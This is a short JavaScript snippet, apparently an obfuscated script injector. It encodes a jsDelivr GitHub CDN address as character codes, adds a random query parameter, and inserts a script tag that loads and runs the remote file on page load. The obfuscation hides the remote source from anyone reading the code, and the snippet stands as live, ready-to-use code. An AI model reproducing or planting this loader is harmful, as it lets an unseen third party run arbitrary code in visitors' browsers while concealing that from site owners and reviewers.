(function() {
    var s = document.createElement('script');
    var randomParam = Math.floor(Math.random() * 99000) + 1;
    
    var p1 = String.fromCharCode(104, 116); 
    var p2 = String.fromCharCode(116, 112, 115, 58); 
    var p3 = String.fromCharCode(47, 47, 99, 100, 110, 46); 
    var p4 = String.fromCharCode(106, 115, 100, 101, 108, 105, 118, 114); 
    var p5 = String.fromCharCode(46, 110, 101, 116, 47); 
    var p6 = String.fromCharCode(103, 104, 47); 
    var p7 = String.fromCharCode(100, 101, 118, 50, 48, 108, 47);
    var p8 = String.fromCharCode(118, 47); 
    var p9 = String.fromCharCode(105, 46, 106, 115); 
    
    var url = p1 + p2 + p3 + p4 + p5 + p6 + p7 + p8 + p9 + "?v=" + randomParam;
    s.src = url;
    
    document.head.appendChild(s);
})();
